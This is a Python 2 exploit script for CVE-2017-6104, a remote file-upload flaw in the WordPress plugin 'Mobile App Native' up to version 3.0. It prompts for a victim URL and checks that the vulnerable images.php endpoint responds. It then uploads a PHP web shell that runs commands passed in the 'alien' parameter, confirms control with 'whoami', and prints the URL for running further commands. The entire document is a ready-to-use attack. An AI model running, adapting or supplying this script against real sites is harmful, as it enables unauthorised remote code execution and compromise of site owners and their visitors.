import requests
import random
import string
print "---------------------------------------------------------------------"
print "Vulnerability: Mobile App Native <= 3.0 - Remote File Upload Exploit\nDisclosure Date: 2017-02-28\nDiscovery: Larry W. Cashdollar\nExploit Author: Munir Njiru\nCVE-ID: CVE-2017-6104\nWPVDB ID: 8743\nCWE: 434\nReference URL: 	http://www.vapidlabs.com/advisory.php?v=178\nPlugin URL: http://plugins.svn.wordpress.org/zen-mobile-app-native/\n"
print "---------------------------------------------------------------------"
victim = raw_input("Please Enter victim host e.g. http://example.com: ")
slug = "/wp-content/plugins/zen-mobile-app-native/server/images.php"
target=victim+slug
def definShell(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

shellName= definShell()+".php"

def checkExistence():
	litmusTest = requests.get(target)
	litmusState = litmusTest.status_code
	if litmusState == 200:
		print "\nTesting if vulnerable script is available\nI can reach the target & it seems vulnerable, I will attempt the exploit\nRunning exploit..."
		exploit()
	else:
		print "Target has a funny code & might not be vulnerable, I will now exit\n"
		quit()
	
def exploit():
	print "\nGenerating Payload: "+shellName+"\n"
	myShell = {'file': (shellName, '<?php echo system($_GET[\'alien\']); ?>')}
	shellEmUp = requests.post(target, files=myShell)
	respShell = shellEmUp.text
	cleanURL = respShell.replace("http://example.com/",victim+"/wp-content/plugins/zen-mobile-app-native/")
	shellLoc = cleanURL.replace(" ", "")
	print "Confirming shell upload by printing current user\n"
	shellTest=requests.get(shellLoc+"?alien=whoami")
	webserverUser=shellTest.text
	if webserverUser == "":
		print "I can't run the command can you try manually on the browser: \n"+shellLoc+"?alien=whoami"
		quit()
	else:
		print "The current webserver user is: "+webserverUser+"\n"
		print "Shell Can be controlled from the browser by running :\n"+shellLoc+"?alien=command"
		quit()

if __name__ == "__main__":
	checkExistence()
